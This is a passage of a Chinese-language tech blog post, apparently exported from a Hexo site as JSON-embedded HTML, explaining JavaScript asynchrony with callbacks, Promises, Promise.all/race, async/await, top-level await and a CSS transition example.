punctuation\">,</span> <span class=\"token number\">5000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n   Promise<span class=\"token punctuation\">.</span><span class=\"token function\">race</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token function\">requestImg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<h3 id=\"async-x2F-await\"><a href=\"#async-x2F-await\" class=\"headerlink\" title=\"async/await\"></a>async/await</h3><p>实际上他们是基于promise实现的，它们的作用就是让你异步执行的代码同步</p>\n<blockquote>\n<p>async用来修饰一个方法，在async修饰的方法中可以使用await来修饰一个方法的调用。</p>\n<p>有点类似于kotlin协程中的suspend 挂起函数 与 Deffered#await方法</p>\n<p>但js可没有什么乱七八糟的协程作用域和上下文，毕竟这些实际上都是在单线程环境下运行的</p>\n</blockquote>\n<p><strong>举个栗子</strong></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// await修饰符只能影响像这样返回一个promise的函数和被async修饰的函数</span>\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">step</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">size<span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">,</span> ele</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n            ele<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>marginLeft <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>size<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">px</span><span class=\"token template-punctuation string\">`</span></span>\n            <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 这里await会让原本异步的方法同步，也就是这里step方法彻底执行完毕才会进入下一次循环</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">id</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> ele <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">200</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">await</span> <span class=\"token function\">step</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> ele<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 顺序执行任务队列</span>\n<span class=\"token comment\">// 让异步队列同步执行</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">awaitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"two\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">awaitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"一点小彩蛋\"><a href=\"#一点小彩蛋\" class=\"headerlink\" title=\"一点小彩蛋\"></a>一点小彩蛋</h4><h5 id=\"top-await\"><a href=\"#top-await\" class=\"headerlink\" title=\"top await\"></a>top await</h5><p>来自路姐姐的指导（</p>\n<blockquote>\n<p>在引用时加一串type=”module” </p>\n<p>可以导入JS模块（下学期内容），还可以使用一些其他JS的新特性，比如 top await，这时 await 就不需要放在 async 函数里才能执行了</p>\n<p>路姐的优雅代码 彳亍</p>\n</blockquote>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>optimize/script.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>module<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">defer</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后就可以直接在外部调用await</p>\n<p>让我们看看路姐的优雅のcode</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> p <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">const</span> content <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">元丰六年十月十二日夜，解衣欲睡，月色入户\n，欣然起行。念无与为乐者，遂至承天寺寻张怀民。怀民亦未寝，相与步于中庭。\n庭下如积水空明，水中藻、荇交横，盖竹柏影也。何夜无月？何处无竹柏？但少闲人如吾两人者耳。\n</span><span class=\"token template-punctuation string\">`</span></span>\n\n<span class=\"token comment\">// 这个函数可以达到类似Java在子线程中调用Thread.sleep的效果</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">ms</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ms<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> content<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    p<span class=\"token punctuation\">.</span>textContent <span class=\"token operator\">=</span> content<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样写就非常彳亍了</p>\n<h5 id=\"css自带的动画\"><a href=\"#css自带的动画\" class=\"headerlink\" title=\"css自带的动画\"></a>css自带的动画</h5><pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">transition</span><span class=\"token punctuation\">:</span> all 1s<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.circle.at-end</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translateX</span><span class=\"token punctuation\">(</span>200px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>transition: all 1s; 被加上了这一条，位置的改变会有一个丝滑的动画，而1s这个参数决定了移动的时间。</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"对异步概念上的理解\"><a href=\"#对异步概念上的理解\" class=\"headerlink\" title=\"对异步概念上的理解\"></a>对异步概念上的理解</h1><blockquote>\n<p>对异步这个单词我早已不陌生了，从去年开始做bukkit开发开始就一直在接触这个词。然而我却从来没有真正理解过异步的含义，之前我实际上是把多线程与异步混淆了。异步操作实际上是完全可以在单线程上执行的</p>\n</blockquote>\n<h2 id=\"什么是异步？\"><a href=\"#什么是异步？\" class=\"headerlink\" title=\"什么是异步？\"></a>什么是异步？</h2><p>很简单，正所谓<strong>连续</strong>的操作就叫<strong>同步</strong>，<strong>不连续</strong>的操作就叫<strong>异步</strong>。</p>\n<p>这样一看，就很好理解了。在多线程的执行环境中，我们启动一个子线程，这个子线程是<strong>串行</strong>执行的，自然是不连续的。</p>\n<p>那么单线程中的异步操作时怎么实现的？</p>\n<p>答案是，先执行完同步代码，最后逐个执行异步队列中的回调函数。</p>\n<p>例如javascript中的异步 （单线程）</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 最后执行</span>\n<span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token comment\">// 操作</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"World\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>输出结果:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Hello\nWorld\nHello World<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"JavaScript中的异步实现方式\"><a href=\"#JavaScript中的异步实现方式\" class=\"headerlink\" title=\"JavaScript中的异步实现方式\"></a>JavaScript中的异步实现方式</h2><blockquote>\n<p>JavaScript中的异步除了Web Worker均为单线程实现</p>\n</blockquote>\n<h3 id=\"回调\"><a href=\"#回调\" class=\"headerlink\" title=\"回调\"></a>回调</h3><p>小心<strong>回调地狱</strong></p>\n<p>回调函数不断嵌套，导致代码可读性大幅下降</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"超哥起床\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>超哥睡回笼觉<span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>\"超哥回到床上超哥睡觉<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">else</span><span class=\"token punctuation\">(</span>超哥睡回笼觉<span class=\"token operator\">==</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n   <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"超哥刷牙\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"超哥洗脸\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        超哥上厕所<span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h3><blockquote>\n<p>Promise本意是承诺，在程序中的意思就是承诺我过一段时间后会给你一个结果。 什么时候会用到过一段时间？答案是异步操作，异步是指可能比较长时间才有结果的才做，例如网络请求、读取本地文件等</p>\n</blockquote>\n<p>使用Promise进行异步操作会提高代码可读性 （摆脱回调地狱）</p>\n<h4 id=\"then-x2F-catch-链式调用\"><a href=\"#then-x2F-catch-链式调用\" class=\"headerlink\" title=\"then&#x2F;catch 链式调用\"></a>then&#x2F;catch 链式调用</h4><p>用法类似Java的CompletableFuture，进行链式调用，可以传参。</p>\n<p>不一样的是多了一个异常处理的回调，个人感觉比CompletableFuture好使。</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//做一些异步操作</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'执行完成'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">if</span> （我找到对象了<span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token function\">）resolve</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"好耶\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">else</span> <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"也许你可以把标准放开一点\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n     console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n     <span class=\"token keyword\">return</span> data\n     <span class=\"token comment\">//此时输出data为resolve传入的参数</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n     console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span>\n     <span class=\"token comment\">//此时输出error为reject传入的参数</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">return</span> data \n   <span class=\"token comment\">//好耶</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token comment\">//好耶</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token comment\">//undefined</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"all-x2F-race-多个异步操作的同步处理\"><a href=\"#all-x2F-race-多个异步操作的同步处理\" class=\"headerlink\" title=\"all&#x2F;race 多个异步操作的同步处理\"></a>all&#x2F;race 多个异步操作的同步处理</h4><ul>\n<li><p>all 全部任务执行完毕后执行下一个任务</p>\n<blockquote>\n<p>Promise的all方法提供了并行执行异步操作的能力，并且在所有异步操作执行完后才执行回调。</p>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> Promise1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">let</span> Promise2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">let</span> Promise3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>Promise1<span class=\"token punctuation\">,</span> Promise2<span class=\"token punctuation\">,</span> Promise3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token function\">funciton</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// 三个都成功则成功  </span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// 只要有失败，则失败 </span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>race 多个任务进行比赛</p>\n<p><em><strong>我选择最快的那个！</strong></em></p>\n<blockquote>\n<p>race方法传入多个promise参数，返回值为其中最快执行完成的promise</p>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//请求某个图片资源</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">requestImg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token keyword\">var</span> img <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Image</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           img<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n               <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n           img<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token string\">'图片的路径'</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       